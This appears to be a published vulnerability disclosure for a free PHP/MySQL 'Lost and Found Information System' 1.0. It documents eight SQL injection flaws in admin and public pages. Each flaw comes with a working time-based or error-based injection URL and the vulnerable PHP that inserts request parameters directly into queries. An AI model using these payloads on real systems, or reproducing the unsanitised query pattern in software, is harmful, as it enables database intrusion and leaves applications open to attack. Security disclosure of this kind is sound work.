### Exploit Title: Lost and Found Information System - multiple vulnerabilities

### Date: 2024-03/15

### Exploit Author: Peanut886

### Vendor Homepage: https://www.sourcecodester.com

### Software Link: https://www.sourcecodester.com/download-code?nid=16525&title=Lost+and+Found+Information+System+using+PHP+and+MySQL+DB+Source+Code+Free+Download

### Version: 1.0

### Tested on: windows11 + phpstudy

# **1.SQL injection vulnerability in admin/categories/manage_category.php**
---
## Sample request POC #1

```
http://localhost/php-lfis/admin/?page=categories/manage_category&id=2%27%20AND%20(SELECT%206955%20FROM%20(SELECT(SLEEP(5)))kDPD)%20AND%20%27PNEs%27=%27PNEs
```
## Sqlmap running results #1

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/1.admin-categories-manage_category.php.jpg "Lost and Found Information System")

## Related Codes admin/categories/manage_category.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `category_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }
}
?>
```

# **2.SQL injection vulnerability in admin/categories/view_category.php**

---

## Sample request POC #2

```
http://localhost/php-lfis/admin/?page=categories/view_category&id=5%27%20AND%20(SELECT%207256%20FROM%20(SELECT(SLEEP(5)))vUYl)%20AND%20%27LXTW%27=%27LXTW
```

## Sqlmap running results #2

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/2.admin-categories-view_category.php.jpg "Lost and Found Information System")

## Related Codes admin/categories/view_category.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `category_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }else{
		echo '<script>alert("Category ID is not valid."); location.replace("./?page=categories")</script>';
	}
}else{
	echo '<script>alert("Category ID is Required."); location.replace("./?page=categories")</script>';
}
?>
```

# **3.SQL injection vulnerability in admin/items/manage_item.php**

---
## Sample request POC #3

```
http://localhost/php-lfis/admin/?page=items/manage_item&id=5%27%20AND%20(SELECT%206144%20FROM%20(SELECT(SLEEP(5)))Qpdz)%20AND%20%27mzou%27=%27mzou
```
## Sqlmap running results #3

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/3.admin-items-manage_item.php.jpg "Lost and Found Information System")

## Related Codes admin/items/manage_item.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `item_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }
}
?>
```

# **4.SQL injection vulnerability in admin/items/view_item.php**
---
## Sample request POC #4

```
http://localhost/php-lfis/admin/?page=items/view_item&id=5%27%20AND%20(SELECT%204709%20FROM%20(SELECT(SLEEP(5)))LRFM)%20AND%20%27ktFa%27=%27ktFa
```
## Sqlmap running results #4

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/4.admin-items-view_item.php.jpg "Lost and Found Information System")

## Related Codes admin/items/view_item.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT *, COALESCE((SELECT `name` FROM `category_list` where `category_list`.`id` = `item_list`. `category_id` ) ,'N/A') as `category` from `item_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }else{
		echo '<script>alert("item ID is not valid."); location.replace("./?page=items")</script>';
	}
}else{
	echo '<script>alert("item ID is Required."); location.replace("./?page=items")</script>';
}
?>
```

# **5.SQL injection vulnerability in admin/inquiries/view_inquiry.php**
---
## Sample request POC #5

```
http://localhost/php-lfis/admin/?page=inquiries/view_inquiry&id=1%27%20AND%20(SELECT%207120%20FROM%20(SELECT(SLEEP(5)))myxW)%20AND%20%27YupF%27=%27YupF
```
## Sqlmap running results #5

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/5.admin-inquiries-view_inquiry.php.jpg "Lost and Found Information System")

## Related Codes admin/inquiries/view_inquiry.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `inquiry_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
		$conn->query("UPDATE `inquiry_list` set `status` = 1 where `id` = '{$id}'");
    }else{
		echo '<script>alert("inquiry ID is not valid."); location.replace("./?page=inquiries")</script>';
	}
}else{
	echo '<script>alert("inquiry ID is Required."); location.replace("./?page=inquiries")</script>';
}
?>
```

# **6.SQL injection vulnerability in admin/user/manage_user.php**

---

## Sample request POC #6

```
http://localhost/php-lfis/admin/?page=user/manage_user&id=9%27%20AND%20(SELECT%203089%20FROM%20(SELECT(SLEEP(5)))aDDz)%20AND%20%27qfOm%27=%27qfOm
```

## Sqlmap running results #6

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/6.admin-user-manage_user.php.jpg "Lost and Found Information System")

## Related Codes admin/user/manage_user.php

```
<?php 
if(isset($_GET['id'])){
    $user = $conn->query("SELECT * FROM users where id ='{$_GET['id']}' ");
    foreach($user->fetch_array() as $k =>$v){
        $meta[$k] = $v;
    }
}
?>
```

# **7.SQL injection vulnerability in items/index.php**

---

## Sample request POC #7

```
http://localhost/php-lfis/?page=items&cid=1%27%20OR%20(SELECT%201013%20FROM(SELECT%20COUNT(*),CONCAT(0x71706a6a71,(SELECT%20(ELT(1013=1013,1))),0x71766a7871,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27sKfj%27=%27sKfj
```

## Sqlmap running results #7

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/7.items-index.php.jpg "Lost and Found Information System")

## Screen results #7

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/7.items-index.php(screen).jpg "Lost and Found Information System")

## Related Codes items/index.php

```
<?php 
if(isset($_GET['cid'])){
    $category_qry = $conn->query("SELECT * FROM `category_list` where `id` = '{$_GET['cid']}'");
    if($category_qry->num_rows > 0){
        foreach($category_qry->fetch_assoc() as $k => $v){
            $cat[$k] = $v; 
        }
    }
}
?>
```

# **8.SQL injection vulnerability in items/view.php**

---

## Sample request POC #8

```
http://localhost/php-lfis/?page=items/view&id=5%27%20AND%20(SELECT%209106%20FROM%20(SELECT(SLEEP(5)))KlfS)%20AND%20%27UioF%27=%27UioF
```

## Sqlmap running results #8

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Lost%20and%20Found%20Information%20System%20-%20multiple%20vulnerabilities/8.items-view.php.jpg "Lost and Found Information System")

## Related Codes items/view.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT *, COALESCE((SELECT `name` FROM `category_list` where `category_list`.`id` = `item_list`. `category_id` ) ,'N/A') as `category` from `item_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }else{
		echo '<script>alert("item ID is not valid."); location.replace("./?page=items")</script>';
	}
}else{
	echo '<script>alert("item ID is Required."); location.replace("./?page=items")</script>';
}
?>
```

